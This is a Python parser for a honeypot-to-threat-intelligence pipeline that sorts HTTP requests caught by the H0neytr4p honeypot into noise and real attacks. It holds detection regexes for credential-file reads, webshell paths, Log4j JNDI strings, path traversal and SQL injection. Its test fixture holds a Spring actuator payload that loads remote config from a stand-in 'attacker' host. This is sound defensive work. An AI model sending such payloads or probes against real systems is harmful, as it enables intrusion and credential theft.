"""H0neytr4p parser — HTTP/HTTPS web application honeypot.

H0neytr4p (a.k.a. ``h0neytr4p``) emulates vulnerable web applications:
exposed config endpoints, Spring actuators, PHP shells, dot-env leaks,
log4j-style ``${jndi:...}`` triggers — the long tail of HTTP exploit
attempts.  T-Pot wires it onto port 80/443 (and assorted alternative
HTTP ports) and emits one ES document per HTTP request.

Per V1_SPEC.md §5.7:

  T-Pot doc fields used:
    src_ip,
    request.method, request.uri, request.body, request.user_agent,
    host_header

  STIX emitted (later, by the orchestrator):
    IPv4-Addr,
    URL (full URI requested),
    Domain-Name (host header),
    Sighting,
    Note with method + body if non-trivial,
    AttackPattern("web-application-attack") if request body contains
      exploit signatures.

  Event correlation: each HTTP request is its own event.  We inherit
  the default one-event-per-session correlator.

Substance filter (per docs/LESSONS_LEARNED_FROM_V0.md §2):

  Drive-by HTTP probes — Censys, Shodan, Mirai-style ``GET /`` health
  checks — are most of the volume.  A bare ``GET /`` from a scanner
  generates a flood of Sightings that V0 over-promoted to full SDO
  graphs; we now only promote a session if at least one of the
  following holds:

    - request.method is anything other than GET (POST / PUT / DELETE /
      PATCH / CONNECT all signal "the attacker is sending content")
    - request.body has more than 8 bytes
    - request.uri matches a tight list of exploit hints
      (:data:`_WEB_EXPLOIT_HINTS`)
    - request.user_agent matches a known exploit-tool UA signature

  The hint list is *deliberately tight*.  Plain ``GET /`` and
  ``GET /favicon.ico`` are noise; ``GET /.env`` and
  ``GET /actuator/env`` are substance.

Per-session promotions to the AttackSession:

  - ``session.urls``     ← reconstructed full URL from host_header + uri
  - ``session.domains``  ← host_header (FQDN form only)
  - ``session.meta``     ← request method / uri / body (truncated) /
                            user_agent / host_header / matched_hints
"""

from __future__ import annotations

import logging
import re
from typing import Iterable, Optional

from tpot2cti.parsers import register
from tpot2cti.parsers.base import AttackSession, BaseParser, ParsedEvent

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

#: Cap on request_body bytes preserved in ``event.meta`` and the
#: downstream Note.  4 KB is more than enough to identify any well-known
#: webshell or RCE payload signature without blowing past the per-Note
#: size cap in STIXBuilder.
REQUEST_BODY_CAP = 4 * 1024

#: Substance threshold on request.body length (bytes).  Bodies above
#: this cutoff are treated as substantive even if no hint regex hits.
BODY_LENGTH_THRESHOLD = 8

#: Tight list of regexes describing URIs / payload markers that we treat
#: as substantive on their own — even on a plain GET.  Keep this list
#: tight: every entry should be something a benign scanner would not
#: emit, but a real attacker / exploit tool reliably does.
#:
#: References:
#:  - dot-env / config exfil: ``GET /.env``, ``GET /config.json``
#:  - Spring Boot actuator probes (CVE-2022-22965 and similar):
#:    ``/actuator/env``, ``/actuator/heapdump``
#:  - Generic webshell paths: ``/shell.php``, ``/cmd.jsp``, ``/wso.php``
#:  - Admin / login bruteforce targets: ``/admin``, ``/wp-admin/``
#:  - RCE patterns in URI:  eval(, base64_decode, system(, exec(
#:  - Log4j JNDI:           ``${jndi:``
#:  - LFI / path traversal: ``../``, ``%2e%2e``, ``/etc/passwd``
#:  - API command endpoints: ``/api/v1/cmd``, ``/api/v2/exec``
_WEB_EXPLOIT_HINTS: list[re.Pattern] = [
    # Sensitive file / config exfiltration
    re.compile(r"/\.env(?:$|[/?])", re.IGNORECASE),
    re.compile(r"/\.git(?:$|[/?])", re.IGNORECASE),
    re.compile(r"/\.aws/credentials", re.IGNORECASE),
    re.compile(r"/config(?:\.json|\.yaml|\.yml|\.php)?(?:$|[/?])", re.IGNORECASE),
    re.compile(r"/etc/passwd", re.IGNORECASE),
    re.compile(r"/wp-config\.php", re.IGNORECASE),
    # Spring Boot Actuator endpoints — common probe targets
    re.compile(r"/actuator/env", re.IGNORECASE),
    re.compile(r"/actuator/heapdump", re.IGNORECASE),
    re.compile(r"/actuator/gateway/", re.IGNORECASE),
    # Webshell / RCE endpoints
    re.compile(r"/shell(?:\.php|\.jsp|\.aspx)?(?:$|[/?])", re.IGNORECASE),
    re.compile(r"/cmd(?:\.php|\.jsp)?(?:$|[/?])", re.IGNORECASE),
    re.compile(r"/wso\.php", re.IGNORECASE),
    re.compile(r"/c99\.php", re.IGNORECASE),
    # Admin / login targets
    re.compile(r"/wp-admin/", re.IGNORECASE),
    re.compile(r"/wp-login\.php", re.IGNORECASE),
    re.compile(r"/admin/(?:config|login|index)", re.IGNORECASE),
    # Generic API exec endpoints
    re.compile(r"/api/v\d+/(?:cmd|exec|shell|eval)", re.IGNORECASE),
    # RCE-shaped payload markers anywhere in the URI
    re.compile(r"eval\s*\(", re.IGNORECASE),
    re.compile(r"base64_decode\s*\(", re.IGNORECASE),
    re.compile(r"system\s*\(", re.IGNORECASE),
    re.compile(r"exec\s*\(", re.IGNORECASE),
    re.compile(r"passthru\s*\(", re.IGNORECASE),
    # Log4j JNDI
    re.compile(r"\$\{jndi:", re.IGNORECASE),
    # Path traversal
    re.compile(r"\.\./"),
    re.compile(r"%2e%2e", re.IGNORECASE),
    # SQL injection markers
    re.compile(r"\bunion\s+select\b", re.IGNORECASE),
    re.compile(r"\bor\s+1\s*=\s*1\b", re.IGNORECASE),
]

#: User-Agent regexes from known exploit / scanning tools.  Hitting any
#: of these is sufficient on its own to treat the session as substantive.
_EXPLOIT_USER_AGENTS: list[re.Pattern] = [
    re.compile(r"\bsqlmap\b", re.IGNORECASE),
    re.compile(r"\bnikto\b", re.IGNORECASE),
    re.compile(r"\bnmap\b", re.IGNORECASE),
    re.compile(r"\bmasscan\b", re.IGNORECASE),
    re.compile(r"\bzgrab\b", re.IGNORECASE),
    re.compile(r"\bdirbuster\b", re.IGNORECASE),
    re.compile(r"\bgobuster\b", re.IGNORECASE),
    re.compile(r"\bhydra\b", re.IGNORECASE),
    re.compile(r"\bmetasploit\b", re.IGNORECASE),
]


# ---------------------------------------------------------------------------
# Parser
# ---------------------------------------------------------------------------

class H0neytr4pParser(BaseParser):
    """Parser for T-Pot's h0neytr4p HTTP/HTTPS honeypot."""

    type_name = "H0neytr4p"

    # ──────────────────────────────────────────────────────────────────
    # parse() — one ES doc → one ParsedEvent
    # ──────────────────────────────────────────────────────────────────

    def parse(self, doc: dict) -> Optional[ParsedEvent]:
        """Convert an H0neytr4p ES doc into a normalized :class:`ParsedEvent`.

        Pulls the request method / URI / body / user-agent (all nested
        under ``request``), the ``host_header`` field, and runs the
        substance hint list now so the result is cached on the event
        and re-used by :meth:`has_substance`.

        Returns ``None`` for malformed docs (missing src_ip or
        @timestamp); these are logged at DEBUG and dropped.
        """
        src_ip = doc.get("src_ip")
        if not src_ip:
            logger.debug("h0neytr4p: skipping doc with no src_ip")
            return None

        ts = self._parse_timestamp(doc)
        if ts is None:
            logger.debug(
                f"h0neytr4p: skipping doc with unparseable @timestamp "
                f"(_id={doc.get('_id')!r})"
            )
            return None

        # h0neytr4p ES shape per 2026-05-22 field-name audit:
        # T-Pot actually ships these fields FLAT at the top level
        # (request_method, request_uri, user-agent, host_header,
        # header_*), NOT nested under a `request` dict as V1_SPEC §5.7
        # originally documented. The nested form is kept as a fallback
        # for older/forked T-Pot versions, but real data hits the flat
        # path on every event. Note the hyphenated `user-agent` and
        # `header_user-agent` spellings — Python dict access works
        # with hyphens, this is not a typo.
        request = doc.get("request") or {}
        if not isinstance(request, dict):
            request = {}

        method = str(
            doc.get("request_method") or request.get("method") or ""
        ).upper() or None
        uri = (
            doc.get("request_uri") or request.get("uri") or ""
        )
        body = (
            doc.get("request_body") or request.get("body") or ""
        )
        user_agent = (
            doc.get("user-agent")
            or doc.get("header_user-agent")
            or request.get("user_agent")
            or ""
        )
        host_header = (
            doc.get("host_header")
            or doc.get("header_host")
            or request.get("host")
            or ""
        )

        # Truncate the body for storage — we cap at REQUEST_BODY_CAP so
        # the downstream Note never carries a megabyte payload, but we
        # still record the *original* length so the Note can mark
        # truncation.
        body_str = str(body)
        body_len = len(body_str.encode("utf-8", errors="replace"))
        if body_len > REQUEST_BODY_CAP:
            body_truncated = body_str.encode("utf-8", errors="replace")[
                :REQUEST_BODY_CAP
            ].decode("utf-8", errors="replace")
        else:
            body_truncated = body_str

        # h0neytr4p typically lands on 80/443 — but T-Pot occasionally
        # exposes it on alt ports, so we trust the doc.
        dst_port = self._safe_int((doc.get("dest_port") or doc.get("dst_port")))

        # Pick a protocol label: tls (port 443 / 8443) wins, otherwise http.
        protocol = "https" if dst_port in (443, 8443) else "http"

        event = ParsedEvent(
            src_ip=str(src_ip),
            timestamp=ts,
            sensor_hostname=str(
                doc.get("t-pot_hostname")
                or (doc.get("host") or {}).get("name")
                or "unknown"
            ),
            event_type="H0neytr4p",
            src_port=self._safe_int(doc.get("src_port")),
            dst_port=dst_port,
            dst_ip=(doc.get("dest_ip") or doc.get("dst_ip")),
            protocol=protocol,
            raw_doc=doc,
        )
        self._populate_geoip(doc, event)

        # ── Stash request metadata on the event ────────────────────────
        if method:
            event.meta["method"] = method
        if uri:
            event.meta["uri"] = str(uri)
        if body_str:
            event.meta["body"] = body_truncated
            event.meta["body_length"] = body_len
            event.meta["body_truncated"] = body_len > REQUEST_BODY_CAP
        if user_agent:
            event.meta["user_agent"] = str(user_agent)
        if host_header:
            event.meta["host_header"] = str(host_header)

        # ── Run the substance hint scan now, cache the matches ─────────
        # We run it once at parse time so has_substance() (called many
        # times by the orchestrator) is just a dict lookup.
        matched_hints = self._scan_hints(uri, body_truncated, user_agent)
        if matched_hints:
            event.meta["matched_hints"] = matched_hints

        return event

    # ──────────────────────────────────────────────────────────────────
    # correlate() — one event per session + promote URL/domain
    # ──────────────────────────────────────────────────────────────────

    def correlate(self, events: Iterable[ParsedEvent]) -> list[AttackSession]:
        """One :class:`AttackSession` per request, with the request's
        reconstructed URL pushed to ``session.urls`` and the host_header
        pushed to ``session.domains``.

        Promotion at correlate time means downstream
        :meth:`has_substance` (and the eventual STIX builder) read
        uniformly-populated session fields instead of having to reach
        into ``events[0].meta`` for every entity.
        """
        sessions: list[AttackSession] = []
        for event in events:
            session = AttackSession.from_event(event)
            self._aggregate_session(session, [event])
            sessions.append(session)
        return sessions

    @staticmethod
    def _aggregate_session(
        session: AttackSession, events: list[ParsedEvent],
    ) -> None:
        """Promote per-event h0neytr4p fields to session aggregates."""
        for e in events:
            meta = e.meta
            host_header = meta.get("host_header")
            uri = meta.get("uri") or ""

            # Reconstruct a full URL when we have both pieces.  We don't
            # try to be clever with scheme detection beyond port 443.
            if host_header and uri:
                scheme = "https" if e.dst_port in (443, 8443) else "http"
                full_url = f"{scheme}://{host_header}{uri}" if uri.startswith("/") else f"{scheme}://{host_header}/{uri}"
                if full_url not in session.urls:
                    session.urls.append(full_url)
            elif uri.startswith("http://") or uri.startswith("https://"):
                # Absolute URI in the request line (HTTP/1.1 to proxies)
                if uri not in session.urls:
                    session.urls.append(uri)

            if host_header:
                # Only push real FQDN-shaped hosts as domains; bare IPv4
                # literals are already attacker / dst observables.
                host_str = str(host_header).split(":", 1)[0]   # strip :port
                if host_str and "." in host_str and not host_str.replace(".", "").isdigit():
                    if host_str not in session.domains:
                        session.domains.append(host_str)

        # Mirror first-event meta onto session.meta for STIX builder use.
        if events:
            first_meta = events[0].meta
            for k in (
                "method", "uri", "body", "body_length", "body_truncated",
                "user_agent", "host_header", "matched_hints",
            ):
                if k in first_meta:
                    session.meta.setdefault(k, first_meta[k])

    # ──────────────────────────────────────────────────────────────────
    # has_substance() — substance filter per V1_SPEC §5.7 + LESSONS §2
    # ──────────────────────────────────────────────────────────────────

    def has_substance(self, session: AttackSession) -> bool:
        """An h0neytr4p session is substantive iff any one of:

          - method is not GET
          - body length > 8 bytes
          - the URI / body / user-agent matched any exploit hint

        Anything else (plain ``GET /``, ``GET /favicon.ico`` from
        scanners) gets the drive-by treatment per LESSONS §2.
        """
        if not session.events:
            return False

        method = session.meta.get("method") or ""
        body_length = session.meta.get("body_length") or 0
        matched_hints = session.meta.get("matched_hints") or []

        if method and method != "GET":
            return True
        if body_length > BODY_LENGTH_THRESHOLD:
            return True
        if matched_hints:
            return True
        return False

    # ──────────────────────────────────────────────────────────────────
    # Helpers
    # ──────────────────────────────────────────────────────────────────

    @staticmethod
    def _scan_hints(uri: str, body: str, user_agent: str) -> list[str]:
        """Return the list of regex-pattern strings that matched.

        We return the pattern string (``regex.pattern``) rather than the
        compiled regex so the result is JSON-serializable and easy to
        surface in the Note body.
        """
        hits: list[str] = []
        haystack = f"{uri}\n{body}"
        for pat in _WEB_EXPLOIT_HINTS:
            if pat.search(haystack):
                if pat.pattern not in hits:
                    hits.append(pat.pattern)
        for pat in _EXPLOIT_USER_AGENTS:
            if pat.search(user_agent):
                if pat.pattern not in hits:
                    hits.append(pat.pattern)
        return hits

    @staticmethod
    def _safe_int(value) -> Optional[int]:
        if value is None:
            return None
        try:
            return int(value)
        except (TypeError, ValueError):
            return None


# Register on import
register(H0neytr4pParser())


# ---------------------------------------------------------------------------
# Smoke test
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    from datetime import datetime, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = H0neytr4pParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — plain GET / from a scanner ──────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "203.0.113.11",
        "src_port": 50100,
        "dst_port": 80,
        "host_header": "203.0.113.99",      # bare IPv4 host_header (typical scanner)
        "t-pot_hostname": "node1",
        "request": {
            "method": "GET",
            "uri": "/",
            "body": "",
            "user_agent": "Mozilla/5.0",
        },
        "geoip": {"country_iso_code": "US", "country_name": "United States"},
    }

    # ── Case 2: substantive — exploit attempt against /actuator/env ────
    substantive_doc = {
        "@timestamp": now.isoformat(),
        "type": "H0neytr4p",
        "src_ip": "198.51.100.55",
        "src_port": 33333,
        "dst_port": 8080,
        "host_header": "target.example.com",
        "t-pot_hostname": "node1",
        "request": {
            "method": "POST",
            "uri": "/actuator/env",
            "body": '{"name":"spring.cloud.bootstrap.location","value":"http://attacker/x.yml"}',
            "user_agent": "python-requests/2.28.0",
        },
        "geoip": {
            "country_iso_code": "RU",
            "country_name": "Russia",
            "asn": 12345,
            "organization": "ExampleNet",
        },
    }

    drive_event = parser.parse(driveby_doc)
    subs_event = parser.parse(substantive_doc)
    assert drive_event and subs_event, "parse failed"

    drive_session = parser.correlate([drive_event])[0]
    subs_session = parser.correlate([subs_event])[0]

    drive_has = parser.has_substance(drive_session)
    subs_has = parser.has_substance(subs_session)
    print(f"drive-by    has_substance: {drive_has}  (expected False)")
    print(f"substantive has_substance: {subs_has}  (expected True)")
    assert drive_has is False, "plain GET / must be non-substantive"
    assert subs_has is True, "POST /actuator/env must be substantive"

    # The substantive session must carry the URL + domain in aggregates,
    # and the matched_hints list in meta.
    assert any("actuator/env" in u for u in subs_session.urls), (
        f"expected /actuator/env URL in session.urls, got {subs_session.urls}"
    )
    assert "target.example.com" in subs_session.domains, (
        f"expected FQDN in session.domains, got {subs_session.domains}"
    )
    assert subs_session.meta.get("matched_hints"), (
        "expected at least one exploit hint to match"
    )
    # Drive-by must NOT push a domain (bare IPv4 host_header)
    assert drive_session.domains == [], (
        f"bare IPv4 host_header must not be promoted to a domain; "
        f"got {drive_session.domains}"
    )

    print("OK")
